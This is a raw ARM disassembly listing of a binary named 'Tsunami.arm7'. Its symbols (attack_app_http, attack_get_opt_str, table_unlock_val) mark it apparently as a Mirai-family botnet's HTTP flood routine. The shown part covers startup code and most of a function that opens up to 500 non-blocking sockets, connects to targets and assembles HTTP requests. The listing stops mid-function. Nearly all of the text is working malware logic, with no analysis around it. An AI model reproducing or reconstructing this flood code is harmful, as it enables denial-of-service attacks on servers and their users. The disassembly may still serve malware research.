
Tsunami.arm7:     file format elf32-littlearm


Disassembly of section .init:

000080d4 <_init>:
    80d4:	e1a0c00d 	mov	ip, sp
    80d8:	e92ddff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
    80dc:	e24cb004 	sub	fp, ip, #4
    80e0:	e91baff0 	ldmdb	fp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, pc}

Disassembly of section .text:

000080f0 <__do_global_dtors_aux>:
    80f0:	e92d4010 	push	{r4, lr}
    80f4:	e59f402c 	ldr	r4, [pc, #44]	; 8128 <__do_global_dtors_aux+0x38>
    80f8:	e5d43000 	ldrb	r3, [r4]
    80fc:	e3530000 	cmp	r3, #0
    8100:	1a000006 	bne	8120 <__do_global_dtors_aux+0x30>
    8104:	e59f3020 	ldr	r3, [pc, #32]	; 812c <__do_global_dtors_aux+0x3c>
    8108:	e3530000 	cmp	r3, #0
    810c:	159f001c 	ldrne	r0, [pc, #28]	; 8130 <__do_global_dtors_aux+0x40>
    8110:	11a0e00f 	movne	lr, pc
    8114:	112fff13 	bxne	r3
    8118:	e3a03001 	mov	r3, #1
    811c:	e5c43000 	strb	r3, [r4]
    8120:	e8bd4010 	pop	{r4, lr}
    8124:	e12fff1e 	bx	lr
    8128:	00028c6c 	.word	0x00028c6c
    812c:	00000000 	.word	0x00000000
    8130:	00028984 	.word	0x00028984

00008134 <frame_dummy>:
    8134:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
    8138:	e59f3040 	ldr	r3, [pc, #64]	; 8180 <frame_dummy+0x4c>
    813c:	e3530000 	cmp	r3, #0
    8140:	e24dd004 	sub	sp, sp, #4
    8144:	159f0038 	ldrne	r0, [pc, #56]	; 8184 <frame_dummy+0x50>
    8148:	159f1038 	ldrne	r1, [pc, #56]	; 8188 <frame_dummy+0x54>
    814c:	11a0e00f 	movne	lr, pc
    8150:	112fff13 	bxne	r3
    8154:	e59f0030 	ldr	r0, [pc, #48]	; 818c <frame_dummy+0x58>
    8158:	e5903000 	ldr	r3, [r0]
    815c:	e3530000 	cmp	r3, #0
    8160:	0a000003 	beq	8174 <frame_dummy+0x40>
    8164:	e59f3024 	ldr	r3, [pc, #36]	; 8190 <frame_dummy+0x5c>
    8168:	e3530000 	cmp	r3, #0
    816c:	11a0e00f 	movne	lr, pc
    8170:	112fff13 	bxne	r3
    8174:	e28dd004 	add	sp, sp, #4
    8178:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
    817c:	e12fff1e 	bx	lr
    8180:	00000000 	.word	0x00000000
    8184:	00028984 	.word	0x00028984
    8188:	00028c70 	.word	0x00028c70
    818c:	00028990 	.word	0x00028990
    8190:	00000000 	.word	0x00000000

00008194 <_start>:
    8194:	e3a0b000 	mov	fp, #0
    8198:	e3a0e000 	mov	lr, #0
    819c:	e49d1004 	pop	{r1}		; (ldr r1, [sp], #4)
    81a0:	e1a0200d 	mov	r2, sp
    81a4:	e52d2004 	push	{r2}		; (str r2, [sp, #-4]!)
    81a8:	e52d0004 	push	{r0}		; (str r0, [sp, #-4]!)
    81ac:	e59fc010 	ldr	ip, [pc, #16]	; 81c4 <_start+0x30>
    81b0:	e52dc004 	push	{ip}		; (str ip, [sp, #-4]!)
    81b4:	e59f000c 	ldr	r0, [pc, #12]	; 81c8 <_start+0x34>
    81b8:	e59f300c 	ldr	r3, [pc, #12]	; 81cc <_start+0x38>
    81bc:	ea00485b 	b	1a330 <__uClibc_main>
    81c0:	eb0040fd 	bl	185bc <__GI_abort>
    81c4:	0001ef50 	.word	0x0001ef50
    81c8:	00011e08 	.word	0x00011e08
    81cc:	000080d4 	.word	0x000080d4

000081d0 <attack_app_http>:
    81d0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    81d4:	e24ddc51 	sub	sp, sp, #20736	; 0x5100
    81d8:	e24dd074 	sub	sp, sp, #116	; 0x74
    81dc:	e1a04002 	mov	r4, r2
    81e0:	e1a05003 	mov	r5, r3
    81e4:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    81e8:	e58d1028 	str	r1, [sp, #40]	; 0x28
    81ec:	e3a02015 	mov	r2, #21
    81f0:	e3a03000 	mov	r3, #0
    81f4:	e1a00004 	mov	r0, r4
    81f8:	e1a01005 	mov	r1, r5
    81fc:	eb000757 	bl	9f60 <attack_get_opt_str>
    8200:	e1a01005 	mov	r1, r5
    8204:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    8208:	e3a02014 	mov	r2, #20
    820c:	e1a00004 	mov	r0, r4
    8210:	e59f3e04 	ldr	r3, [pc, #3588]	; 901c <attack_app_http+0xe4c>
    8214:	eb000751 	bl	9f60 <attack_get_opt_str>
    8218:	e1a01005 	mov	r1, r5
    821c:	e3a02008 	mov	r2, #8
    8220:	e3a03000 	mov	r3, #0
    8224:	e1a09000 	mov	r9, r0
    8228:	e1a00004 	mov	r0, r4
    822c:	eb00074b 	bl	9f60 <attack_get_opt_str>
    8230:	e1a01005 	mov	r1, r5
    8234:	e1a0a000 	mov	sl, r0
    8238:	e3a02016 	mov	r2, #22
    823c:	e1a00004 	mov	r0, r4
    8240:	e59f3da0 	ldr	r3, [pc, #3488]	; 8fe8 <attack_app_http+0xe18>
    8244:	eb000745 	bl	9f60 <attack_get_opt_str>
    8248:	e1a01005 	mov	r1, r5
    824c:	e1a08000 	mov	r8, r0
    8250:	e3a02018 	mov	r2, #24
    8254:	e1a00004 	mov	r0, r4
    8258:	e3a03001 	mov	r3, #1
    825c:	eb000837 	bl	a340 <attack_get_opt_int>
    8260:	e1a01005 	mov	r1, r5
    8264:	e3a02007 	mov	r2, #7
    8268:	e3a03050 	mov	r3, #80	; 0x50
    826c:	e1a06000 	mov	r6, r0
    8270:	e1a00004 	mov	r0, r4
    8274:	eb000831 	bl	a340 <attack_get_opt_int>
    8278:	e28d1070 	add	r1, sp, #112	; 0x70
    827c:	e2411025 	sub	r1, r1, #37	; 0x25
    8280:	e3a02b0a 	mov	r2, #10240	; 0x2800
    8284:	e1a03800 	lsl	r3, r0, #16
    8288:	e58d1014 	str	r1, [sp, #20]
    828c:	e1a00001 	mov	r0, r1
    8290:	e2822001 	add	r2, r2, #1
    8294:	e3a01000 	mov	r1, #0
    8298:	e1a07823 	lsr	r7, r3, #16
    829c:	eb00398b 	bl	168d0 <__GI_memset>
    82a0:	e3580000 	cmp	r8, #0
    82a4:	135a0000 	cmpne	sl, #0
    82a8:	13a04000 	movne	r4, #0
    82ac:	03a04001 	moveq	r4, #1
    82b0:	1a000003 	bne	82c4 <attack_app_http+0xf4>
    82b4:	e28ddf5d 	add	sp, sp, #372	; 0x174
    82b8:	e28dda05 	add	sp, sp, #20480	; 0x5000
    82bc:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    82c0:	e12fff1e 	bx	lr
    82c4:	e1a00008 	mov	r0, r8
    82c8:	eb003216 	bl	14b28 <util_strlen>
    82cc:	e35000ff 	cmp	r0, #255	; 0xff
    82d0:	cafffff7 	bgt	82b4 <attack_app_http+0xe4>
    82d4:	e1a0000a 	mov	r0, sl
    82d8:	eb003212 	bl	14b28 <util_strlen>
    82dc:	e350007f 	cmp	r0, #127	; 0x7f
    82e0:	cafffff3 	bgt	82b4 <attack_app_http+0xe4>
    82e4:	e1a00009 	mov	r0, r9
    82e8:	eb00320e 	bl	14b28 <util_strlen>
    82ec:	e3500009 	cmp	r0, #9
    82f0:	d28d2a05 	addle	r2, sp, #20480	; 0x5000
    82f4:	d582416c 	strle	r4, [r2, #364]	; 0x16c
    82f8:	caffffed 	bgt	82b4 <attack_app_http+0xe4>
    82fc:	e1a00009 	mov	r0, r9
    8300:	eb003208 	bl	14b28 <util_strlen>
    8304:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8308:	e591c16c 	ldr	ip, [r1, #364]	; 0x16c
    830c:	e150000c 	cmp	r0, ip
    8310:	da00000a 	ble	8340 <attack_app_http+0x170>
    8314:	e7d9300c 	ldrb	r3, [r9, ip]
    8318:	e2432020 	sub	r2, r3, #32
    831c:	e2433061 	sub	r3, r3, #97	; 0x61
    8320:	e3530019 	cmp	r3, #25
    8324:	97c9200c 	strbls	r2, [r9, ip]
    8328:	928d3a05 	addls	r3, sp, #20480	; 0x5000
    832c:	9593c16c 	ldrls	ip, [r3, #364]	; 0x16c
    8330:	e28dea05 	add	lr, sp, #20480	; 0x5000
    8334:	e28cc001 	add	ip, ip, #1
    8338:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    833c:	eaffffee 	b	82fc <attack_app_http+0x12c>
    8340:	e3a0003d 	mov	r0, #61	; 0x3d
    8344:	eb002c75 	bl	13520 <table_unlock_val>
    8348:	e3a0003e 	mov	r0, #62	; 0x3e
    834c:	eb002c73 	bl	13520 <table_unlock_val>
    8350:	e3a0003f 	mov	r0, #63	; 0x3f
    8354:	eb002c71 	bl	13520 <table_unlock_val>
    8358:	e3a00040 	mov	r0, #64	; 0x40
    835c:	eb002c6f 	bl	13520 <table_unlock_val>
    8360:	e3a00041 	mov	r0, #65	; 0x41
    8364:	eb002c6d 	bl	13520 <table_unlock_val>
    8368:	e3a00042 	mov	r0, #66	; 0x42
    836c:	eb002c6b 	bl	13520 <table_unlock_val>
    8370:	e3a00043 	mov	r0, #67	; 0x43
    8374:	eb002c69 	bl	13520 <table_unlock_val>
    8378:	e3a00044 	mov	r0, #68	; 0x44
    837c:	eb002c67 	bl	13520 <table_unlock_val>
    8380:	e3a00045 	mov	r0, #69	; 0x45
    8384:	eb002c65 	bl	13520 <table_unlock_val>
    8388:	e3a00046 	mov	r0, #70	; 0x46
    838c:	eb002c63 	bl	13520 <table_unlock_val>
    8390:	e3560f7d 	cmp	r6, #500	; 0x1f4
    8394:	a3a06f7d 	movge	r6, #500	; 0x1f4
    8398:	e3a00047 	mov	r0, #71	; 0x47
    839c:	e58d6040 	str	r6, [sp, #64]	; 0x40
    83a0:	eb002c5e 	bl	13520 <table_unlock_val>
    83a4:	e3a01d31 	mov	r1, #3136	; 0xc40
    83a8:	e59d0040 	ldr	r0, [sp, #64]	; 0x40
    83ac:	e2811004 	add	r1, r1, #4
    83b0:	eb003e09 	bl	17bdc <calloc>
    83b4:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    83b8:	e3520000 	cmp	r2, #0
    83bc:	e58d0024 	str	r0, [sp, #36]	; 0x24
    83c0:	da00004d 	ble	84fc <attack_app_http+0x32c>
    83c4:	e1a05000 	mov	r5, r0
    83c8:	e3a0b000 	mov	fp, #0
    83cc:	e3a03000 	mov	r3, #0
    83d0:	e3e02000 	mvn	r2, #0
    83d4:	e59d102c 	ldr	r1, [sp, #44]	; 0x2c
    83d8:	e5852000 	str	r2, [r5]
    83dc:	e5c53004 	strb	r3, [r5, #4]
    83e0:	e1a0000b 	mov	r0, fp
    83e4:	eb0036c1 	bl	15ef0 <__aeabi_idivmod>
    83e8:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    83ec:	e1a03281 	lsl	r3, r1, #5
    83f0:	e0433181 	sub	r3, r3, r1, lsl #3
    83f4:	e083600c 	add	r6, r3, ip
    83f8:	e5962010 	ldr	r2, [r6, #16]
    83fc:	e285ef85 	add	lr, r5, #532	; 0x214
    8400:	e1a0000e 	mov	r0, lr
    8404:	e1a01008 	mov	r1, r8
    8408:	e5852010 	str	r2, [r5, #16]
    840c:	e58de030 	str	lr, [sp, #48]	; 0x30
    8410:	eb0031ce 	bl	14b50 <util_strcpy>
    8414:	e5d53214 	ldrb	r3, [r5, #532]	; 0x214
    8418:	e353002f 	cmp	r3, #47	; 0x2f
    841c:	0a000008 	beq	8444 <attack_app_http+0x274>
    8420:	e59d0030 	ldr	r0, [sp, #48]	; 0x30
    8424:	eb0031bf 	bl	14b28 <util_strlen>
    8428:	e1a02000 	mov	r2, r0
    842c:	e2850f85 	add	r0, r5, #532	; 0x214
    8430:	e2800001 	add	r0, r0, #1
    8434:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
    8438:	eb003920 	bl	168c0 <__GI_memmove>
    843c:	e3a0302f 	mov	r3, #47	; 0x2f
    8440:	e5c53214 	strb	r3, [r5, #532]	; 0x214
    8444:	e1a01009 	mov	r1, r9
    8448:	e2850e5a 	add	r0, r5, #1440	; 0x5a0
    844c:	eb0031bf 	bl	14b50 <util_strcpy>
    8450:	e2850e59 	add	r0, r5, #1424	; 0x590
    8454:	e1a01009 	mov	r1, r9
    8458:	e2800007 	add	r0, r0, #7
    845c:	eb0031bb 	bl	14b50 <util_strcpy>
    8460:	e2850fc5 	add	r0, r5, #788	; 0x314
    8464:	e2800001 	add	r0, r0, #1
    8468:	e1a0100a 	mov	r1, sl
    846c:	eb0031b7 	bl	14b50 <util_strcpy>
    8470:	e5d63014 	ldrb	r3, [r6, #20]
    8474:	e353001f 	cmp	r3, #31
    8478:	8a000010 	bhi	84c0 <attack_app_http+0x2f0>
    847c:	e5964010 	ldr	r4, [r6, #16]
    8480:	eb00285c 	bl	125f8 <rand_next>
    8484:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    8488:	e1a02c24 	lsr	r2, r4, #24
    848c:	e1822421 	orr	r2, r2, r1, lsr #8
    8490:	e2043cff 	and	r3, r4, #65280	; 0xff00
    8494:	e5d61014 	ldrb	r1, [r6, #20]
    8498:	e1822403 	orr	r2, r2, r3, lsl #8
    849c:	e1822c04 	orr	r2, r2, r4, lsl #24
    84a0:	e0822130 	add	r2, r2, r0, lsr r1
    84a4:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    84a8:	e1a03c22 	lsr	r3, r2, #24
    84ac:	e1833420 	orr	r3, r3, r0, lsr #8
    84b0:	e2021cff 	and	r1, r2, #65280	; 0xff00
    84b4:	e1833401 	orr	r3, r3, r1, lsl #8
    84b8:	e1833c02 	orr	r3, r3, r2, lsl #24
    84bc:	e5853010 	str	r3, [r5, #16]
    84c0:	eb00284c 	bl	125f8 <rand_next>
    84c4:	e59f3b20 	ldr	r3, [pc, #2848]	; 8fec <attack_app_http+0xe1c>
    84c8:	e0821093 	umull	r1, r2, r3, r0
    84cc:	e1a02122 	lsr	r2, r2, #2
    84d0:	e1a03102 	lsl	r3, r2, #2
    84d4:	e0833002 	add	r3, r3, r2
    84d8:	e0630000 	rsb	r0, r3, r0
    84dc:	e3500004 	cmp	r0, #4
    84e0:	979ff100 	ldrls	pc, [pc, r0, lsl #2]
    84e4:	ea000656 	b	9e44 <attack_app_http+0x1c74>
    84e8:	00009f08 	.word	0x00009f08
    84ec:	00009edc 	.word	0x00009edc
    84f0:	00009f34 	.word	0x00009f34
    84f4:	00009e1c 	.word	0x00009e1c
    84f8:	00009e9c 	.word	0x00009e9c
    84fc:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    8500:	e28d2da1 	add	r2, sp, #10304	; 0x2840
    8504:	e2811e5a 	add	r1, r1, #1440	; 0x5a0
    8508:	e2822030 	add	r2, r2, #48	; 0x30
    850c:	e1a03427 	lsr	r3, r7, #8
    8510:	e281100c 	add	r1, r1, #12
    8514:	e2422024 	sub	r2, r2, #36	; 0x24
    8518:	e20770ff 	and	r7, r7, #255	; 0xff
    851c:	e58d1010 	str	r1, [sp, #16]
    8520:	e58d3018 	str	r3, [sp, #24]
    8524:	e58d201c 	str	r2, [sp, #28]
    8528:	e58d700c 	str	r7, [sp, #12]
    852c:	e3a00000 	mov	r0, #0
    8530:	eb0037ad 	bl	163ec <__GI_time>
    8534:	e3a03000 	mov	r3, #0
    8538:	e28dca05 	add	ip, sp, #20480	; 0x5000
    853c:	e58d0034 	str	r0, [sp, #52]	; 0x34
    8540:	e58c30cc 	str	r3, [ip, #204]	; 0xcc
    8544:	e2833004 	add	r3, r3, #4
    8548:	e283ea05 	add	lr, r3, #20480	; 0x5000
    854c:	e2833004 	add	r3, r3, #4
    8550:	e3a02000 	mov	r2, #0
    8554:	e28ee0cc 	add	lr, lr, #204	; 0xcc
    8558:	e3530080 	cmp	r3, #128	; 0x80
    855c:	e78e200d 	str	r2, [lr, sp]
    8560:	1afffff8 	bne	8548 <attack_app_http+0x378>
    8564:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8568:	e581204c 	str	r2, [r1, #76]	; 0x4c
    856c:	e243307c 	sub	r3, r3, #124	; 0x7c
    8570:	e2832a05 	add	r2, r3, #20480	; 0x5000
    8574:	e2833004 	add	r3, r3, #4
    8578:	e3a00000 	mov	r0, #0
    857c:	e282204c 	add	r2, r2, #76	; 0x4c
    8580:	e3530080 	cmp	r3, #128	; 0x80
    8584:	e782000d 	str	r0, [r2, sp]
    8588:	1afffff8 	bne	8570 <attack_app_http+0x3a0>
    858c:	e59d3040 	ldr	r3, [sp, #64]	; 0x40
    8590:	e1530000 	cmp	r3, r0
    8594:	daffffe4 	ble	852c <attack_app_http+0x35c>
    8598:	e59da010 	ldr	sl, [sp, #16]
    859c:	e1a08000 	mov	r8, r0
    85a0:	e1a0600a 	mov	r6, sl
    85a4:	e1a07000 	mov	r7, r0
    85a8:	ea000017 	b	860c <attack_app_http+0x43c>
    85ac:	e3530002 	cmp	r3, #2
    85b0:	0a0001cd 	beq	8cec <attack_app_http+0xb1c>
    85b4:	e3530004 	cmp	r3, #4
    85b8:	0a0000bf 	beq	88bc <attack_app_http+0x6ec>
    85bc:	e3530006 	cmp	r3, #6
    85c0:	0a0001d5 	beq	8d1c <attack_app_http+0xb4c>
    85c4:	e3530007 	cmp	r3, #7
    85c8:	0a000262 	beq	8f58 <attack_app_http+0xd88>
    85cc:	e353000a 	cmp	r3, #10
    85d0:	0a000275 	beq	8fac <attack_app_http+0xddc>
    85d4:	e353000b 	cmp	r3, #11
    85d8:	0a0003e3 	beq	956c <attack_app_http+0x139c>
    85dc:	e3a03000 	mov	r3, #0
    85e0:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    85e4:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    85e8:	eb004614 	bl	19e40 <__GI___libc_close>
    85ec:	e3e03000 	mvn	r3, #0
    85f0:	e50635ac 	str	r3, [r6, #-1452]	; 0xfffffa54
    85f4:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    85f8:	e2877001 	add	r7, r7, #1
    85fc:	e2866d31 	add	r6, r6, #3136	; 0xc40
    8600:	e1570002 	cmp	r7, r2
    8604:	e2866004 	add	r6, r6, #4
    8608:	0a000050 	beq	8750 <attack_app_http+0x580>
    860c:	e55635a8 	ldrb	r3, [r6, #-1448]	; 0xfffffa58
    8610:	e2465e5a 	sub	r5, r6, #1440	; 0x5a0
    8614:	e3530001 	cmp	r3, #1
    8618:	e245500c 	sub	r5, r5, #12
    861c:	0a0000a0 	beq	88a4 <attack_app_http+0x6d4>
    8620:	e3530000 	cmp	r3, #0
    8624:	1affffe0 	bne	85ac <attack_app_http+0x3dc>
    8628:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    862c:	e3a05000 	mov	r5, #0
    8630:	e28dca05 	add	ip, sp, #20480	; 0x5000
    8634:	e3700001 	cmn	r0, #1
    8638:	e58c514c 	str	r5, [ip, #332]	; 0x14c
    863c:	e58c5150 	str	r5, [ip, #336]	; 0x150
    8640:	e58c5154 	str	r5, [ip, #340]	; 0x154
    8644:	e58c5158 	str	r5, [ip, #344]	; 0x158
    8648:	1b0045fc 	blne	19e40 <__GI___libc_close>
    864c:	e3a00002 	mov	r0, #2
    8650:	e3a01001 	mov	r1, #1
    8654:	e1a02005 	mov	r2, r5
    8658:	eb003a7d 	bl	17054 <__GI_socket>
    865c:	e3700001 	cmn	r0, #1
    8660:	e1a04000 	mov	r4, r0
    8664:	e50605ac 	str	r0, [r6, #-1452]	; 0xfffffa54
    8668:	0affffe1 	beq	85f4 <attack_app_http+0x424>
    866c:	e3a01003 	mov	r1, #3
    8670:	e1a02005 	mov	r2, r5
    8674:	eb00364e 	bl	15fb4 <__GI___libc_fcntl>
    8678:	e3a01004 	mov	r1, #4
    867c:	e3802b02 	orr	r2, r0, #2048	; 0x800
    8680:	e1a00004 	mov	r0, r4
    8684:	eb00364a 	bl	15fb4 <__GI___libc_fcntl>
    8688:	e3a0c801 	mov	ip, #65536	; 0x10000
    868c:	e28dea05 	add	lr, sp, #20480	; 0x5000
    8690:	e24cc001 	sub	ip, ip, #1
    8694:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8698:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    869c:	e1a01005 	mov	r1, r5
    86a0:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    86a4:	e3a02008 	mov	r2, #8
    86a8:	e3a0c004 	mov	ip, #4
    86ac:	e283306c 	add	r3, r3, #108	; 0x6c
    86b0:	e58dc000 	str	ip, [sp]
    86b4:	eb003a54 	bl	1700c <__GI_setsockopt>
    86b8:	e59d1018 	ldr	r1, [sp, #24]
    86bc:	e59d200c 	ldr	r2, [sp, #12]
    86c0:	e516459c 	ldr	r4, [r6, #-1436]	; 0xfffffa64
    86c4:	e28dea05 	add	lr, sp, #20480	; 0x5000
    86c8:	e3a0c002 	mov	ip, #2
    86cc:	e1813402 	orr	r3, r1, r2, lsl #8
    86d0:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    86d4:	e58e4150 	str	r4, [lr, #336]	; 0x150
    86d8:	e28dec51 	add	lr, sp, #20736	; 0x5100
    86dc:	e1ce34be 	strh	r3, [lr, #78]	; 0x4e
    86e0:	e546c5a8 	strb	ip, [r6, #-1448]	; 0xfffffa58
    86e4:	e59d3034 	ldr	r3, [sp, #52]	; 0x34
    86e8:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    86ec:	e1cec4bc 	strh	ip, [lr, #76]	; 0x4c
    86f0:	e3a02010 	mov	r2, #16
    86f4:	e281104c 	add	r1, r1, #76	; 0x4c
    86f8:	e50635a4 	str	r3, [r6, #-1444]	; 0xfffffa5c
    86fc:	eb00392f 	bl	16bc0 <__libc_connect>
    8700:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8704:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8708:	e1a022ac 	lsr	r2, ip, #5
    870c:	e1a02102 	lsl	r2, r2, #2
    8710:	e28ee070 	add	lr, lr, #112	; 0x70
    8714:	e082200e 	add	r2, r2, lr
    8718:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
    871c:	e20c001f 	and	r0, ip, #31
    8720:	e3a03001 	mov	r3, #1
    8724:	e1811013 	orr	r1, r1, r3, lsl r0
    8728:	e15c0008 	cmp	ip, r8
    872c:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
    8730:	daffffaf 	ble	85f4 <attack_app_http+0x424>
    8734:	e08c8003 	add	r8, ip, r3
    8738:	e59d2040 	ldr	r2, [sp, #64]	; 0x40
    873c:	e2877001 	add	r7, r7, #1
    8740:	e2866d31 	add	r6, r6, #3136	; 0xc40
    8744:	e1570002 	cmp	r7, r2
    8748:	e2866004 	add	r6, r6, #4
    874c:	1affffae 	bne	860c <attack_app_http+0x43c>
    8750:	e3580000 	cmp	r8, #0
    8754:	0affff74 	beq	852c <attack_app_http+0x35c>
    8758:	e28dea05 	add	lr, sp, #20480	; 0x5000
    875c:	e3a0c001 	mov	ip, #1
    8760:	e3a05000 	mov	r5, #0
    8764:	e58ec15c 	str	ip, [lr, #348]	; 0x15c
    8768:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    876c:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    8770:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    8774:	e58e5160 	str	r5, [lr, #352]	; 0x160
    8778:	e28cc05c 	add	ip, ip, #92	; 0x5c
    877c:	e28110cc 	add	r1, r1, #204	; 0xcc
    8780:	e282204c 	add	r2, r2, #76	; 0x4c
    8784:	e1a03005 	mov	r3, r5
    8788:	e1a00008 	mov	r0, r8
    878c:	e58dc000 	str	ip, [sp]
    8790:	eb0036c1 	bl	1629c <__libc_select>
    8794:	e1a04000 	mov	r4, r0
    8798:	e1a00005 	mov	r0, r5
    879c:	eb003712 	bl	163ec <__GI_time>
    87a0:	e1540005 	cmp	r4, r5
    87a4:	e58d0038 	str	r0, [sp, #56]	; 0x38
    87a8:	daffff5f 	ble	852c <attack_app_http+0x35c>
    87ac:	e58d5044 	str	r5, [sp, #68]	; 0x44
    87b0:	ea000015 	b	880c <attack_app_http+0x63c>
    87b4:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    87b8:	e2833070 	add	r3, r3, #112	; 0x70
    87bc:	e08c2003 	add	r2, ip, r3
    87c0:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
    87c4:	e1a03153 	asr	r3, r3, r1
    87c8:	e3130001 	tst	r3, #1
    87cc:	0a000006 	beq	87ec <attack_app_http+0x61c>
    87d0:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    87d4:	e3530006 	cmp	r3, #6
    87d8:	0a000212 	beq	9028 <attack_app_http+0xe58>
    87dc:	e3530007 	cmp	r3, #7
    87e0:	0a00015c 	beq	8d58 <attack_app_http+0xb88>
    87e4:	e353000a 	cmp	r3, #10
    87e8:	0a00039c 	beq	9660 <attack_app_http+0x1490>
    87ec:	e59d2044 	ldr	r2, [sp, #68]	; 0x44
    87f0:	e59d3040 	ldr	r3, [sp, #64]	; 0x40
    87f4:	e2822001 	add	r2, r2, #1
    87f8:	e28aad31 	add	sl, sl, #3136	; 0xc40
    87fc:	e1520003 	cmp	r2, r3
    8800:	e58d2044 	str	r2, [sp, #68]	; 0x44
    8804:	e28aa004 	add	sl, sl, #4
    8808:	0affff47 	beq	852c <attack_app_http+0x35c>
    880c:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8810:	e24a9e5a 	sub	r9, sl, #1440	; 0x5a0
    8814:	e3700001 	cmn	r0, #1
    8818:	e249900c 	sub	r9, r9, #12
    881c:	0afffff2 	beq	87ec <attack_app_http+0x61c>
    8820:	e1a022a0 	lsr	r2, r0, #5
    8824:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8828:	e1a0c102 	lsl	ip, r2, #2
    882c:	e28ee070 	add	lr, lr, #112	; 0x70
    8830:	e08c200e 	add	r2, ip, lr
    8834:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
    8838:	e200101f 	and	r1, r0, #31
    883c:	e1a03153 	asr	r3, r3, r1
    8840:	e3130001 	tst	r3, #1
    8844:	0affffda 	beq	87b4 <attack_app_http+0x5e4>
    8848:	e28dca05 	add	ip, sp, #20480	; 0x5000
    884c:	e3a04004 	mov	r4, #4
    8850:	e3a05000 	mov	r5, #0
    8854:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8858:	e28dec51 	add	lr, sp, #20736	; 0x5100
    885c:	e3a01001 	mov	r1, #1
    8860:	e2833068 	add	r3, r3, #104	; 0x68
    8864:	e58c5168 	str	r5, [ip, #360]	; 0x168
    8868:	e58c4164 	str	r4, [ip, #356]	; 0x164
    886c:	e28ee064 	add	lr, lr, #100	; 0x64
    8870:	e1a02004 	mov	r2, r4
    8874:	e58de000 	str	lr, [sp]
    8878:	eb0038fe 	bl	16c78 <getsockopt>
    887c:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8880:	e5913168 	ldr	r3, [r1, #360]	; 0x168
    8884:	e1900003 	orrs	r0, r0, r3
    8888:	1a0001c1 	bne	8f94 <attack_app_http+0xdc4>
    888c:	e51a35ac 	ldr	r3, [sl, #-1452]	; 0xfffffa54
    8890:	e1a022a3 	lsr	r2, r3, #5
    8894:	e203101f 	and	r1, r3, #31
    8898:	e1a0c102 	lsl	ip, r2, #2
    889c:	e54a45a8 	strb	r4, [sl, #-1448]	; 0xfffffa58
    88a0:	eaffffc3 	b	87b4 <attack_app_http+0x5e4>
    88a4:	e5963004 	ldr	r3, [r6, #4]
    88a8:	e3530000 	cmp	r3, #0
    88ac:	13a03004 	movne	r3, #4
    88b0:	154635a8 	strbne	r3, [r6, #-1448]	; 0xfffffa58
    88b4:	054635a8 	strbeq	r3, [r6, #-1448]	; 0xfffffa58
    88b8:	0affff5a 	beq	8628 <attack_app_http+0x458>
    88bc:	e3e03000 	mvn	r3, #0
    88c0:	e3a09000 	mov	r9, #0
    88c4:	e2850d21 	add	r0, r5, #2112	; 0x840
    88c8:	e586300c 	str	r3, [r6, #12]
    88cc:	e2800004 	add	r0, r0, #4
    88d0:	e3a01b01 	mov	r1, #1024	; 0x400
    88d4:	e5869000 	str	r9, [r6]
    88d8:	eb0030b7 	bl	14bbc <util_zero>
    88dc:	e3a01b0a 	mov	r1, #10240	; 0x2800
    88e0:	e59d001c 	ldr	r0, [sp, #28]
    88e4:	e5869294 	str	r9, [r6, #660]	; 0x294
    88e8:	eb0030b3 	bl	14bbc <util_zero>
    88ec:	e59d001c 	ldr	r0, [sp, #28]
    88f0:	eb00308c 	bl	14b28 <util_strlen>
    88f4:	e285be59 	add	fp, r5, #1424	; 0x590
    88f8:	e59dc01c 	ldr	ip, [sp, #28]
    88fc:	e28bb007 	add	fp, fp, #7
    8900:	e08c0000 	add	r0, ip, r0
    8904:	e1a0100b 	mov	r1, fp
    8908:	eb003090 	bl	14b50 <util_strcpy>
    890c:	e59d001c 	ldr	r0, [sp, #28]
    8910:	eb003084 	bl	14b28 <util_strlen>
    8914:	e59de01c 	ldr	lr, [sp, #28]
    8918:	e59f16d0 	ldr	r1, [pc, #1744]	; 8ff0 <attack_app_http+0xe20>
    891c:	e08e0000 	add	r0, lr, r0
    8920:	eb00308a 	bl	14b50 <util_strcpy>
    8924:	e59d001c 	ldr	r0, [sp, #28]
    8928:	eb00307e 	bl	14b28 <util_strlen>
